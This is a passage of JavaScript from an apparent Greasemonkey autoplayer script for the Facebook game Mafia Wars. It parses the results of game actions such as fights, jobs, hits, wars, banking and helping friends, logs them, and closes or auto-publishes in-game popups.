          attackElt = lastOpponent.attackAgain;
          DEBUG('Clicking "Attack Again"!');
        }
        // Attack!
        Autoplay.fx = function() {
          clickAction = 'fight';
          clickContext = context;
          staminaBurst (BURST_ALWAYS, attackElt);
          DEBUG('Clicked to fight: name=' + context.name +
                ', id=' + context.id + ', level=' + context.level +
                ', mafia=' + context.mafia + ', faction=' + context.faction);
        };
        Autoplay.delay = isGMChecked('staminaNoDelay') ? noDelay : getAutoPlayDelay();
        Autoplay.start();
        return true;
      }
      break;

  /* inner_page/popup_fodder responses: */
    case 'autohit':
    case 'fight':
      return logFightResponse(rootElt, messagebox, context);
      break;

    case 'autoRob':
      return logRobResponse(rootElt, messagebox, context);

    // quickHeal() and autoHeal() response parsing:
    case 'heal':
      if (innerNoTags.indexOf('doctor healed') != -1) {
        GM_setValue('healWaitStarted',false);
        var addHealth = inner.split('doctor healed <strong>')[1].split('health')[0];
        cost = inner.split('doctor healed <strong>')[1].match(REGEX_CASH);
        addToLog('health Icon', '<span style="color:#FF9999;">' + ' Health +'+ addHealth + ' for <span class="expense">' + cost + '</span>.</span>');
        if (isGMChecked('quickHeal') && healthElt && innerNoTags.match(/,"user_health":([0-9]+),/i)) {
          healthElt.innerHTML = RegExp.$1;
        }
      } else if (innerNoTags.indexOf('You cannot heal so fast') != -1) {
        addToLog('warning Icon', '<span style="color:#FF9999;">' + 'Attempted to heal too quickly.' + '</span>');
      }

      // Returning home after healing ensures that the home page still gets
      // checked occasionally during sustained periods of stamina spending.
      Autoplay.start();
      return true;
      break;

    case 'job':
      var masteryGainElt ;
      xpGainElt = xpathFirst('.//dd[@class="message_experience"]', messagebox);
      xpGainElt = xpGainElt ? xpGainElt : xpathFirst('.//dd[@class="experience"]', messagebox);
      var jobContainer = "job"+missions[GM_getValue('selectMission')][MISSION_NUMBER];
      var jobContainerElt = xpathFirst('.//div[@id="'+jobContainer+'"]', rootElt);
      masteryGainElt = xpathFirst('.//div[@id="'+jobContainer+'"]//div[@class="mastery_bar"]', rootElt);
      jobName = missions[GM_getValue('selectMission')][MISSION_NAME];

      var masteryGainTxt = "";
      var pushNextJob = false;
      // IF we have the mastery gain bar,
      if(masteryGainElt) {
         if( (GM_getValue('selectTier')!= '0.0'  ) ||
           (!isGMChecked('multipleJobs'))  )
             {
              masteryGainTxt = '. Las Vegas Job ' + masteryGainElt.innerHTML.substr(0, masteryGainElt.innerHTML.indexOf('%')) + '% Mastered';
              if( (parseInt(masteryGainElt.innerHTML.substr(0, masteryGainElt.innerHTML.indexOf('%'))) )==100 )
                {
                   pushNextJob = true;
                   //DEBUG((parseInt( masteryGainElt.innerHTML.substr(0, masteryGainElt.innerHTML.indexOf('%')))) + '% =100% flagged as MASTERED ' );
                // } else DEBUG('current mastery=' + (parseInt( masteryGainElt.innerHTML.substr(0, masteryGainElt.innerHTML.indexOf('%')))) );
                }
             } //else DEBUG(' mastery check skipped tier =' +  GM_getValue('selectTier')  + ' multiple' + (!isGMChecked('multipleJobs')) );
      } //else DEBUG(' mastery check skipped no masterygainelt ');

      //if (pushNextJob) DEBUG (' - - - push next job was true ');
      //else DEBUG (' - - - push next job was false ');

      if (xpGainElt) {
        //DEBUG (' - - - push next job expgainelt 2 ');
        jobOptimizeOn = false;
        // Job completed successfully.
        result = 'You performed ' + '<span class="job">' + jobName + '</span> earning <span class="good">' + xpGainElt.innerHTML.toLowerCase() + '</span>';
        var cashGainElt = xpathFirst('.//dd[@class="message_cash"]', messagebox);
        cashGainElt = cashGainElt ? cashGainElt : xpathFirst('.//dd[@class="vegas_cash_icon"]', messagebox);
        if (cashGainElt) result += ' and <span class="good">' + cashGainElt.innerHTML + '</span>';
        if(masteryGainElt) result += masteryGainTxt;
        result += '.';
        if (innerNoTags.indexOf('you spent no energy') != -1) result += ' You spent 0 energy on this job.';
        addToLog('process Icon', result);

        jobCombo(rootElt);
        if(masteryGainElt) jobLoot(jobContainerElt);  // here
        else jobLoot(rootElt);
        // Add message if job tier prize found.
        if (innerNoTags.match(/.*(An* .+ was added to your inventory[^.]*.)/i)) {
          addToLog('lootbag Icon', RegExp.$1);
        }

        // Ask for help if auto ask is on and enough experience was gained.
        var xpGain = parseInt(xpGainElt.innerHTML);
        var xpGainMin = parseInt(GM_getValue('autoAskJobHelpMinExp'));
        if (isGMChecked('autoAskJobHelp') && (!xpGainMin || xpGain >= xpGainMin)) {
        var elt = xpathFirst('.//div[@class="message_buttons"]//span[@class="sexy_jobhelp"]', messagebox);
        if(!elt) elt = xpathFirst('.//div[@class="message_buttons"]//a[@class="sexy_button_new short_white sexy_call_new" and contains(.,"Let Friends Get a Bonus")]', messagebox);
          // ask for help
          if (elt) {
            Autoplay.fx = function() {
              clickElement(elt);
              addToLog('process Icon', 'Asked for help with <span class="job">' + missions[GM_getValue('selectMission')][MISSION_NAME] + '</span>.');
            };
            Autoplay.start();
            return true;
          }
        }
      } else if (innerNoTags.indexOf('You are not high enough level to do this job') != -1) {
        addToLog('warning Icon', 'You are not high enough level to do ' + missions[GM_getValue('selectMission', 1)][MISSION_NAME] + '.');
        addToLog('warning Icon', 'Job processing will stop');
        GM_setValue('autoMission', 0);
        // DEBUG (' - - - push next job was true 3 ');
      } else if (innerNoTags.indexOf('Success') != -1) {
        jobOptimizeOn = false;
        addToLog('process Icon', inner);
        // DEBUG (' - - - push next job was true 4 ');
      } else if (innerNoTags.indexOf('Missing') != -1) {
        if (getJobRowItems(jobName)) {
          DEBUG(' - - need items jobid='+jobid+' selectMission='+GM_getValue('selectMission', 1));
          if (jobid != GM_getValue('selectMission', 1))  Autoplay.fx = autoMission;
        }
      } else {
        DEBUG('Unrecognized job response.');
      }
      //return;

      if (pushNextJob) {
          DEBUG('Job Mastery of 100% detected, Reloading');
          customizeVegasJobs();
          //goHome();
      }else {
        return;
      }

      Autoplay.start();
      return true;

      break;

    case 'hitman':
      // If the target is gone, there is nothing to do.
      if (innerNoTags.indexOf('someone else took out') != -1) {
        DEBUG(inner);
        return false;
      }

      var targetKilled = (innerNoTags.indexOf('You knocked out') != -1);
      if (innerNoTags.indexOf('You WON') != -1) {
        var cashGain = innerNoTags.match(/gained.*?([A-Z]?\$[\d,]*\d)/i);
        var cashWon = RegExp.$1;
        experience = innerNoTags.match(/\d+\s+experience\s+points?/i);
        addToLog('yeah Icon', 'Hit ' + linkToString(context.profile, 'user') +
                 ', <span class="good">WON ' + cashWon + '</span> and ' +
                 '<span class="good">' + experience + '</span>.');
        cashWon = parseCash(cashWon);
        GM_setValue('hitmanWinCountInt',GM_getValue('hitmanWinCountInt',0)+1);
        GM_setValue('hitmanWinDollarsInt', String(parseInt(GM_getValue('hitmanWinDollarsInt', 0)) + cashWon));
        GM_setValue('totalExpInt', GM_getValue('totalExpInt', 0) + parseInt(experience));
        GM_setValue('totalWinDollarsInt', String(parseInt(GM_getValue('totalWinDollarsInt', 0)) + cashWon));
        GM_setValue('fightWin$NY', String(parseInt(GM_getValue('fightWin$NY', 0)) + cashWon));

        if (!targetKilled && canSpendStamina() && ptsToNextLevel > 6) {
          var eltAtk = xpathFirst('.//a[contains(.,"Attack Again")]', messagebox);
          if (eltAtk) {
            // Attack again immediately.
            Autoplay.fx = function() {
              clickAction = action;
              clickContext = context;
              staminaBurst (BURST_WIN, eltAtk);
              DEBUG('Clicked to repeat the hit on ' + clickContext.name +
                    ' (' + clickContext.id + ').');
            };
            updateLogStats(STAMINA_HOW_HITMAN);
            Autoplay.delay = noDelay;
            Autoplay.start();
            return true;
          }
        }
      } else if (innerNoTags.indexOf('You LOST') != -1) {
        var t = innerNoTags.match(/LOST.*?([A-Z]?\$[\d,]*\d)/i);
        var cashLoss = RegExp.$1;
        result = 'Hit ' + linkToString(context.profile, 'user') +
                     ' <span class="bad">LOST ' + cashLoss + '.</span>';
        cashLoss = parseCash(cashLoss);
        GM_setValue('hitmanLossCountInt',GM_getValue('hitmanLossCountInt',0)+1);
        GM_setValue('hitmanLossDollarsInt', String(parseInt(GM_getValue('hitmanLossDollarsInt', 0)) + cashLoss));
        GM_setValue('totalLossDollarsInt', String(parseInt(GM_getValue('totalLossDollarsInt', 0)) + cashLoss));
        GM_setValue('fightLoss$NY', String(parseInt(GM_getValue('fightLoss$NY', 0)) + cashLoss));
        if (context.id) {
          // Add the opponent to the avoid list.
          setHitmanOpponentAvoid(context.id);
          result += ' Avoiding.';
        }
        addToLog('omg Icon', result);
      } else if (innerNoTags.indexOf('This player is currently part of your mafia') != -1) {
        if (context.id) {
          setHitmanOpponentAvoid(context.id);
        }
      } else {
        DEBUG(inner);
      }
      if (innerNoTags.indexOf('You were snuffed') != -1) {
        addToLog('updateBad Icon', 'You <span class="bad">DIED</span>.');
      }
      if (targetKilled) {
        if (context.id) {
          addSavedListItem('hitmanListKilled', context.id, 100);
        }
        addToLog('killedMobster Icon', ' You <span class="bad">KILLED</span> ' +
                 linkToString(context.profile, 'user') +
                 ' and collected the <span class="money">' +
                 context.bounty + '</span> bounty set by ' +
                 linkToString(context.payer, 'user') + '.');

        GM_setValue('hitmanWinCountInt',GM_getValue('hitmanWinCountInt',0)+1);
        GM_setValue('hitmanWinDollarsInt', String(parseInt(GM_getValue('hitmanWinDollarsInt', 0)) + parseCash(context.bounty)));
        //GM_setValue('totalExpInt', GM_getValue('totalExpInt', 0) + parseInt(experience));
        GM_setValue('totalWinDollarsInt', String(parseInt(GM_getValue('totalWinDollarsInt', 0)) + parseCash(context.bounty)));
        GM_setValue('fightWin$NY', String(parseInt(GM_getValue('fightWin$NY', 0)) + parseCash(context.bounty)));
      }
      updateLogStats(STAMINA_HOW_HITMAN);
      randomizeStamina();
      break;

    case 'war':
      // Remove invalid war targets
      if (innerNoTags.indexOf('Target user is not a friend') != -1 ||
        innerNoTags.indexOf('Target user does not exist') != -1) {
        removeSavedListItem('autoWarTargetList', context.target_id);
        addToLog('warning Icon', 'Invalid war target (id='+context.target_id+'). Removing from list.');
      }
      // Friend is already at war with somebody else
      else if (innerNoTags.indexOf('is already at war with someone else') != -1) {
        addToLog('info Icon', inner.split('.')[0] + '. Cycling warlist. ' );
        cycleSavedList('autoWarTargetList');
      }
      // Go back to war page after betrayal
      else if (innerNoTags.indexOf('You successfully betrayed') != -1) {
        addToLog(logIcon, inner.split('<br><br>')[0] + '</div>');
        break;
      }
      // Cycle war list after successful war declaration
      else if (innerNoTags.indexOf('You successfully declared war') != -1) {
        cycleSavedList('autoWarTargetList');
        addToLog('yeah Icon', inner);
      }
      // War attack result
      else if (innerNoTags.indexOf('WON') != -1 ||
               innerNoTags.indexOf('LOST') != -1) {
        var logIcon = innerNoTags.indexOf('LOST') != -1 ? 'omg Icon' : 'yeah Icon';
        if (innerNoTags.indexOf('to winning this war.') != -1)
          addToLog(logIcon, inner.split('to winning this war.')[0] + 'to winning this war.</div>');
        else
          addToLog(logIcon, inner);
      }
      else {
        addToLog('info Icon', inner);
      }

      if (helpWar) {
        // Help attempt was processed. Increment the update count.
        GM_setValue('logPlayerUpdatesCount', 1 + GM_getValue('logPlayerUpdatesCount', 0));
        helpWar = false;
      }

      // Visit the War Tab again
      setGMTime('warTimer', '00:00');
      Autoplay.start();
      return true;
      break;

    case 'stats':
      if (innerNoTags.match(/You just upgraded your (\w+) by (\d+)/i)) {
        var statName = RegExp.$1;
        var statIndex = eval(statName.toUpperCase() + '_STAT');
        var statIcon = eval(statName.toLowerCase() + 'Icon');
        var statIconTxt = statName.toLowerCase() + 'Icon';
        var statInc = isNaN(RegExp.$2) ? 1 : parseInt(RegExp.$2);
        GM_setValue('nextStat' , (statIndex + 1) % 4);
        switch (statIndex) {
          case ATTACK_STAT:    curAttack    += statInc; break;
          case DEFENSE_STAT:   curDefense   += statInc; break;
          case HEALTH_STAT:    maxHealth    += statInc; break;
          case ENERGY_STAT:    maxEnergy    += statInc; break;
          case STAMINA_STAT:   maxStamina   += statInc; break;
        }
        addToLog('process Icon', '<span style="color:#885588;">'+statIcon+' '+statName+' increased by '+statInc+' point(s).</span>');
      } else {
        DEBUG('Failed to increment stat.');
      }
      break;

    case 'accept':
      var accepts = innerNoTags.match(/You joined/gi);
      if (accepts) {
        addToLog('process Icon', 'Accepted ' + accepts.length + ' mafia ' +
                 (accepts.length > 1 ? ' invites.' : ' invite.'));
      } else {
        DEBUG('Unrecognized response for "accept" action : '+inner);
      }
      break;

    case 'energypack':
      addToLog('energyPack Icon', 'Used an <span class="good">Energy Pack</span>.');
      energyPackElt = undefined;
      DEBUG('Unrecognized response for "energypack" action : '+inner);
      break;

    case 'help':
      var helpElt = xpathFirst('.//a[contains(.,"Help ")]', messagebox);
      // If help element is found, click it immediately
      if (helpElt) {
        Autoplay.fx = function() {
          clickElement(helpElt);
          clickAction = 'help';
          clickContext = context;
        };
        Autoplay.delay = noDelay;
        Autoplay.start();
        return true;
      }

      DEBUG('Parsing job help.');

      // Help attempt was processed. Increment the update count.
      GM_setValue('logPlayerUpdatesCount', 1 + GM_getValue('logPlayerUpdatesCount', 0));

      var user = linkToString(xpathFirst('.//a[contains(@onclick,"xw_controller=stats&xw_action=view")]', messagebox), 'user');
      if (context && !user) {
        user = context.user;
      }
      if (innerNoTags.indexOf('not your friend') != -1 ||
          innerNoTags.indexOf('You need to be friends') != -1) {
        addToLog('info Icon', 'Failed to help' + (user? ' ' + user : '') +
                 ' with job. Reason: not friends.');
      } else if (innerNoTags.indexOf('You are too late') != -1) {
        addToLog('info Icon', 'You are too late to help ' +
                 (user? ' ' + user : '') + ' with this job.');
      } else if (innerNoTags.indexOf('already helped') != -1) {
        addToLog('info Icon', 'Already helped ' + user + ' with this job.');
      } else if (innerNoTags.indexOf('You received') != -1 ||
                 innerNoTags.indexOf('You helped') != -1) {
        cost = innerNoTags.match(REGEX_CASH);
        experience = 0;
        if (innerNoTags.match(/(\d+)\s+experience\s+points?/i)) {
          experience = parseInt(RegExp.$1);
        }
        if (innerNoTags.indexOf('Special Bonus') != -1) {
          var loot = innerNoTags.split('gained a ')[1];
          addToLog('lootbag Icon', 'Found a <span class="loot">'+ loot.split('.<span')[0] + '</span> while helping on a job.');
        }
        result = 'You received ' + '<span class="good">' +
                 cost + '</span>' + ' and ' +
                 '<span class="good">' + experience + ' experience</span>' +
                 ' for helping ' + user + ' complete the job.';
        GM_setValue('passivetotalJobExpInt', parseInt(GM_getValue('passivetotalJobExpInt',0)) + experience);
        addToLog('updateGood Icon', result);
        updateLogStats();
      } else if (innerNoTags.indexOf('25 friends') != -1) {
        addToLog('info Icon', 'Failed to help' + (user ? ' ' + user : '') + ' with job. Reason: already helped 25 friends for the day in that city.');
      } else {
        addToLog('info Icon', 'WARNING: Not sure what happened when ' +
                 'trying to help' + (user? ' ' + user : '') + '.' +
                 (context? ' ' + context.help : '') +
                 ' Perhaps you interfered by clicking on something?');
      }
      Autoplay.start();
      return true;
      break;

    case 'help burners':
      var helpElt = xpathFirst('.//a[contains(.,"Accept")]', messagebox);
      // If help element is found, click it immediately
      if (helpElt) {
        Autoplay.fx = function() {
          clickElement(helpElt);
          clickAction = 'help burners';
          clickContext = context;
        };
        Autoplay.delay = noDelay;
        Autoplay.start();
        return true;
      }

      DEBUG('Parsing burner help.');

      // Help burners attempt was processed. Increment the update count.
      GM_setValue('logPlayerUpdatesCount', 1 + GM_getValue('logPlayerUpdatesCount', 0));

      addToLog('info Icon', innerNoTags);

      Autoplay.start();
      return true;
      break;

    case 'help parts':
      var helpElt = xpathFirst('.//a[contains(.,"Send Item")]', messagebox);
      // If help element is found, click it immediately
      if (helpElt) {
        Autoplay.fx = function() {
          clickElement(helpElt);
          clickAction = 'help parts';
          clickContext = context;
        };
        Autoplay.delay = noDelay;
        Autoplay.start();
        return true;
      }

      DEBUG('Parsing parts help.');

      // Help parts attempt was processed. Increment the update count.
      GM_setValue('logPlayerUpdatesCount', 1 + GM_getValue('logPlayerUpdatesCount', 0));

      if (innerNoTags.indexOf('You sent ') != -1) {
        addToLog('info Icon', 'You sent ' + inner.split('You sent ')[1].split('</div>')[0]);
      }

      Autoplay.start();
      return true;
      break;

    case 'deposit':
      // Log if city has changed after banking
      if (parseInt(city) != parseInt(context)) {
        addToLog('warning Icon', 'Warning! You have traveled from ' +
                 cities[context][CITY_NAME] + ' to ' +
                 cities[city][CITY_NAME] +
                 ' while banking. Check your money.');
      }

      if (innerNoTags.match(/deposited/i)) {
        addToLog(cities[city][CITY_CASH_CSS], inner);
      } else {
        DEBUG(inner);
      }

      // Close banking
      var closePopElt = xpathFirst('//div[@class="pop_box"]//a[@class="pop_close"]')
      clickElement(closePopElt);
      break;

    case 'withdraw':
      if (innerNoTags.match(/withdrew/i)) {
        addToLog(cities[city][CITY_CASH_CSS], inner);
      } else {
        DEBUG(inner);
      }

      // Close banking
      var closePopElt = xpathFirst('//div[@class="pop_box"]//a[@class="pop_close"]')
      clickElement(closePopElt);
      break;

    // FIXME: Add parsing here
    case 'buy item':
      break;

    case 'buy property':
      addToLog('info Icon', inner);
      break;

    case 'build item':
      var timerName = 'buildCarTimer';
      switch (context.buildType) {
        case 11: timerName = 'buildCarTimer'; break;
        case 12: timerName = 'buildWeaponTimer'; break;
      }
      if (/You cannot craft/i.test(inner)) {
        if(context.buildType==11) inner = "Chop Shop : " + inner;
        if(context.buildType==12) inner = "Weapons Depot : " + inner;
      }
      // Visit again after 1 hour if you cannot craft yet
      if (/You cannot craft/i.test(inner) ||
          /You do not have/i.test(inner) ||
          /You need a higher/i.test(inner) ) {
        setGMTime(timerName, '1 hour');
        addToLog('info Icon', inner);
      } else {
        setGMTime(timerName, '24 hours');
        if (inner.match(/You built (.+?\.)(.+?)<\/div>/)) {
          var log = 'You built <span class="loot">'+ RegExp.$1+'</span>.';
          if (RegExp.$2.match(/You gained.+&nbsp;(.+?\.)/))
            log += ' You gained ' + RegExp.$1;
          //log += '</span>';
          addToLog('lootbag Icon', log);
        }
      }
      break;

    default:
      addToLog('warning Icon', 'BUG DETECTED: Unrecognized action "' +
               action + '".');
      DEBUG('Unrecognized Action :'+inner);
  }
  return false;
}

function closePopup(eltPopup, coolName) {
  // This routine needs the handle of the popup!
  // Not a button in the popup, but the main element
  // So if we figure out we have a button, then let's try
  // to find the main element
  //DEBUG('closePopup Processing');
  //var eltPopup = xpathFirst(xpath);
  if (!eltPopup) return false;

  // Once we see a post pop-up, set the timer to close it
  DEBUG('Got rid of ' + coolName + ' popup: ' + eltPopup.id);
  var closeElt = xpathFirst('.//a[@class="pop_close"]',eltPopup);
  if (closeElt) {
    clickElement(closeElt);
    return true;
  }
  var skipPostElt = document.getElementById('fb_dialog_cancel_button');
  if (skipPostElt) {
    clickElement (skipPostElt);
    return true;
  }

  // Try to close it the old fashioned way
  eltPopup.style.display = 'none';
  var popupIDBG = eltPopup.id.replace('_box','_box_bg');
  var eltPopupBG = document.getElementById(popupIDBG);
  if (eltPopupBG) eltPopupBG.style.display = 'none';
  popupIDBG = eltPopup.id.replace('_box','_bg');
  eltPopupBG = document.getElementById(popupIDBG);
  if (eltPopupBG) eltPopupBG.style.display = 'none';
  return true;
}

// Handle various popups
// This function is specifically for handling windows that popup
// during gameplay and we want to either grab some info off the
// window and log it, or we want to just close the window.
// This routing is not for clicking buttons other than to close the window.
function handlePopups() {
  // If we're not on the main window,
  // we're not doing any actions!
  if (window.top != window.self) {
    return;
  }

  try {
    //DEBUG('Popups: Checking for popups');

    // Look for all popups that are showing
    var popupElts = $x('.//div[(((contains(@id,"pop") and not(contains(@id,"pop_bg")) and not(contains(@id,"box_bg"))) and contains(@style, "block")) or contains(@id,"mystery")) and not(@id="popup_fodder")]', appLayoutElt);
    if (popupElts && popupElts.length > 0) {
      // Process each popup that is open
      DEBUG('Popups Found: ' + popupElts.length);
      for (var i = 0, iLength=popupElts.length; i < iLength; ++i) {
        if (popupElts[i] && popupElts[i].scrollWidth && popupElts[i].innerHTML.length > 0) {
          var popupInner = popupElts[i].innerHTML;
          var popupInnerNoTags = popupInner.untag();
          // Skip these popups!
          if (popupInner.indexOf('id="marketplace"') != -1 // The Marketplace
            || popupInner.indexOf('id="original_buyframe_popup"') != -1  // The Marketplace
            || popupInner.indexOf('marketplace_title.png') != -1  // The Marketplace
            || popupInner.indexOf('giftcard_iframe') != -1  // The Marketplace
            || popupInner.indexOf('xw_controller=hospital') != -1 // The Hospital
            || popupInner.indexOf('bank_popup') != -1 // The Bank
            || popupInner.indexOf('vault_popup') != -1 // Las Vegas Vault
            || popupInner.indexOf('xw_controller=challenge') != -1 // Challenges
            || popupInner.indexOf('chop_build_final') != -1 // Chop Shop/Weapon Depot success popup
            || popupInner.indexOf('id="ChopShopCarousel"') != -1 // Chop Shop/Weapon Depot craft popup
            || popupInner.indexOf('mw_app=slotmachine') != -1 // Slot Machine
            || popupInner.indexOf('id="map_boss_fight"') != -1 // Vegas Boss fights
            || popupInner.indexOf('class="account_settings_title"') != -1 // Account Settings
            ) {
            continue;
          }
          DEBUG('Popup Found: ' + popupElts[i].id + ' ' + popupInnerNoTags);

          /* THESE POPUPS get always processed/closed: */
          // Get rid of Paypal
          if (popupInnerNoTags.indexOf('paypal') != -1) return(closePopup(popupElts[i], "Paypal"));

          // Get rid of buyframe popup (You are almost out of reward points)
          if (popupInner.indexOf('xw_action=buyframe_popup') != -1) return(closePopup(popupElts[i], "Buy Reward Points"));

          // Get rid of Crime Spree Congratulations popup
          if (popupInnerNoTags.indexOf('safehouse_congrats') != -1) return(closePopup(popupElts[i], "Crime Spree Congratulations"));

          // Get rid of Treasure Chest popup
          if (popupInnerNoTags.indexOf('Treasure Chest') != -1) return(closePopup(popupElts[i], "Treasure Chest"));

          // Get rid of Keep Winning popup
          if (popupInnerNoTags.indexOf('Keep winning') != -1) return(closePopup(popupElts[i], "Robbery Keep Winning"));

          // Get rid of Tired of Losing popup
          if (popupInnerNoTags.indexOf('Tired of losing') != -1) return(closePopup(popupElts[i], "Robbery Tired of Losing"));

          // Get rid of 7-11 popup
          if (popupInnerNoTags.indexOf('seven_eleven') != -1) return(closePopup(popupElts[i], "Seven Eleven"));

          // Get rid of Slots Collection popup
          if (popupInnerNoTags.indexOf('The Slots Collection') != -1) return(closePopup(popupElts[i], "Slots Collection"));

          // Process The Global Cup Collection popup
          if (popupInnerNoTags.indexOf('The Global Cup Collection') != -1) return(closePopup(popupElts[i], "The Global Cup Collection"));

          // Get rid of Grow your Mafia popup
          if (popupInnerNoTags.indexOf('friend to be in your mafia and help') != -1) return(closePopup(popupElts[i], "Grow your Mafia"));

          // Get rid of Slot Machine Teaser popup
          if (popupInnerNoTags.indexOf('New Loot!') != -1) return(closePopup(popupElts[i], "Slot Machine Flushed"));

          // Get rid of Daily take popup
					// FIXME show take or do something fun with this
					if (popupInnerNoTags.indexOf('keep the streak alive') != -1) return(closePopup(popupElts[i], "The Daily Take"));

          // Get rid of Proceed to Vegas Level 6 popup
          if (popupInnerNoTags.indexOf('Proceed to') != -1) return(closePopup(popupElts[i], "Vegas Level 6"));

          /* THESE POPUPS get processed only when PS MWAP is running: */
          if (running) {

            /* Disable Chop Shop/Weapon Depot popup detection for timers
            // Get rid of Chop Shop/Weapon Depot popup
            if (popupInnerNoTags.match(/You have built (.+?)\./)) {
              addToLog('lootbag Icon', '<span class="loot">'+' You have built '+ RegExp.$1 + '.</span>');
              return(closePopup(popupElts[i], "Chop Shop/Weapon Depot"));
            }*/

            /* Process The Hospital
            var eltPubButton = xpathFirst('.//a[contains(@onclick,"xw_action=heal")]',popupElts[i]);
            if (eltPubButton) {
              //DEBUG('Popup Process: The Hospital Processed');
              //clickElement(eltPubButton);
            }*/

            // Process Sharing Secret Stash
            var eltPubButton = xpathFirst('.//a[contains(@onclick,"post_job_loot_feed")]',popupElts[i]);
            if (eltPubButton) {
              DEBUG('Popup Process: Share Secret Stash Processed');
              if (isGMChecked('autoSecretStash')) {
                clickElement(eltPubButton);
                return true;
              } else {
                return(closePopup(popupElts[i], "Secret Stash"));
              }
            }

            // Process Secret Stash
            if (popupInnerNoTags.indexOf('Get yours') != -1) {
              DEBUG('Popup Process: Get Secret Stash Processed');
              var eltButton = xpathFirst('.//button',popupElts[i]);
              if (eltButton) {
                eltLoot = xpathFirst('.//div[contains(@id,"job_gift_item_1")]',popupElts[i]);
                if (eltLoot) {
                  addToLog('lootbag Icon', 'Received <span class="loot">'+ eltLoot.innerHTML.untag() + '</span> from a secret stash.');
                }
                clickElement(eltButton);
              }
              return true;
            }

            // Process Crime Spree popup
            var eltPubButton = xpathFirst('.//a[contains(@onclick,"postFeedAndSendGiftBoxOpen")]',popupElts[i]);
            if (eltPubButton) {
              if (popupInnerNoTags.match(/and you got (.+?)/)) {
                DEBUG('Popup Process: Crime Spree Loot Processed');
                addToLog('lootbag Icon', 'Received <span class="loot">'+ RegExp.$1 + '</span> from the Crime Spree.');
              }
              if (isGMChecked('autoSafehousePublish')) {
                clickElement(eltPubButton);
                return true;
              } else {
                return(closePopup(popupElts[i], "Crime Spree Gifts"));
              }
            }

            // Process Red Mystery Bag popup
            if (popupElts[i].id.indexOf('mystery_bag_drop') != -1) {
              DEBUG('Popup Process: Red Mystery Bag Processed');
              eltLoot = xpathFirst('.//div[contains(@class,"good")]',popupElts[i]);
              if (eltLoot) {
                addToLog('lootbag Icon', 'Received <span class="loot">'+ eltLoot.innerHTML.untag() + '</span> from a red mystery bag.');
              }
              return(closePopup(popupElts[i], "Red Mystery Bag"));
            }

            // Process Iced popup
            if (popupInner.indexOf('iced_pop') != -1) {
              var icedCountTextElt = xpathFirst('.//div[@class="iced_pop_body_count_text"]');
              var icedCountElt = xpathFirst('.//div[@class="iced_pop_body_count_number"]');
              var opponentElt = xpathFirst('.//div[@class="fightres_opponent"]');
              var opponentNameElt = xpathFirst('.//div[@class="fightres_name"]/a', opponentElt);
              if (icedCountElt && icedCountTextElt && opponentElt) {
                bodyCount = parseInt(icedCountElt.innerHTML.replace(',', ''));
                IcedPublishingCount = parseInt(GM_getValue('IcedPublishingCount')) ? parseInt(GM_getValue('IcedPublishingCount')) : 0;
                publishFrequency =  parseInt(GM_getValue('autoIcePublishFrequency')) ? parseInt(GM_getValue('autoIcePublishFrequency')) : 1;
                logFrequency = parseInt(IcedPublishingCount % publishFrequency);
                eltIce = xpathFirst('.//a[contains(.,"Share with Friends")]', popupElts[i]);
                if(eltIce && isGMChecked('autoIcePublish') && (IcedPublishingCount % publishFrequency == 0)) {
                  addToLog('info Icon', ' You <span style="color:#00FFFF;">ICED</span> ' +
                  linkToString(opponentNameElt, 'user') + '. ' + icedCountTextElt.innerHTML + ' <span style="color:#00FFFF;">' +
                  icedCountElt.innerHTML + '</span> and published Iced Bonus ('+logFrequency+'/'+publishFrequency+')');
                  clickElement(eltIce);
                  DEBUG('handlePopups(): Clicked to publish iced opponent bonus.');
                } else {
                  // Get rid of Iced popup:
                  logtxt = 'You <span style="color:#00FFFF;">ICED</span> ' + linkToString(opponentNameElt, 'user') + '. ' +
                           icedCountTextElt.innerHTML + ' <span style="color:#00FFFF;">' + icedCountElt.innerHTML + '</span>.';
                  if(isGMChecked('autoIcePublish')) logtxt+= ' Iced bonus not published ('+logFrequency+'/'+publishFrequency+')';
                  addToLog('info Icon', logtxt);
                  IcedPublishingCount+=1;
                  GM_setValue('IcedPublishingCount',IcedPublishingCount);
                  return(closePopup(popupElts[i], "Iced Popup"));
                }
                IcedPublishingCount+=1;
                GM_setValue('IcedPublishingCount',IcedPublishingCount);
              } else {
                // missing info, just go away
                return(closePopup(popupElts[i], "Iced Popup"));
              }
            }

            //Process Reward for Energy Packs
            if (popupInner.indexOf('Thank') != -1 && isGMChecked('rewardEnergyPack')) {
              var energyReward;
              var energyRewardID;
              var i=1;
              energyRewardID = 'energy_thnx_btn_'+i;
              while(energyReward = document.getElementById(energyRewardID, popupElts[i])){
                var eltThanx = xpathFirst('.//a[contains(.,"Thank")]', energyReward);
                if(eltThanx){
                  clickElement(eltThanx);
                  DEBUG('Clicked to reward Helper : '+i);
                  addToLog('info Icon','You sent a gift to reward Helper : '+i);
                } else {
                  DEBUG('Gift already sent to Helper : '+i);
                }
                i++;
                energyRewardID = 'energy_thnx_btn_'+i;
              }
              return(closePopup(popupElts[i], "Energy Reward"));
            }

            // Process Robbery Loot popup
            if (popupInnerNoTags.indexOf('You cleared the full board') != -1) {
              // Look for any loot on popup
              DEBUG('Popup Process: Processing robbing board');
              if (popupInner.match(/You\s+(earned|gained|received|collected)\s+(some|an?)\s+bonus\s+(.+?)<\/div>/i)) {
                addToLog('lootbag Icon', 'Found <span class="loot">'+ RegExp.$3 + '</span> on robbing board.');
              }
              if (popupInnerNoTags.match(/(\d+) Bonus Experience/i)) {
                //var exp = m[1].replace(/[^0-9]/g, '');
                var exp = RegExp.$1.replace(/[^0-9]/g, '');
                var boardrecord ="";
                if (popupInner.match(/Your record on this board was\s+(.+?)\./i)) boardrecord = ' Record: <span class="good">' + RegExp.$1+'</span>';

                addToLog('yeah Icon', 'Robbing board cleared. Bonus: <span class="good">' + exp + ' Experience</span>.'+ boardrecord);
                updateRobStatistics(null,parseInt(exp));
                updateLogStats();
              }
              return(closePopup(popupElts[i], "Robbing Board Popup"));
            }

            // Process Level Up popup
            var eltPubButton = xpathFirst('.//a[contains(@onclick,"postLevelUpFeedAndSend")]',popupElts[i]);
            if (eltPubButton) {
              if (popupInnerNoTags.match(/promoted to Level (.+?) C/)) {
                DEBUG('Popup Process: Level Up Processed');
                addToLog('info Icon', '<span class="loot">'+' You were promoted to level '+ RegExp.$1);
              }
              if (isGMChecked('autoLevelPublish')) {
                clickElement(eltPubButton);
                return true;
              } else {
                return(closePopup(popupElts[i], "Level Up"));
              }
            }

            // Process Loyalty popup
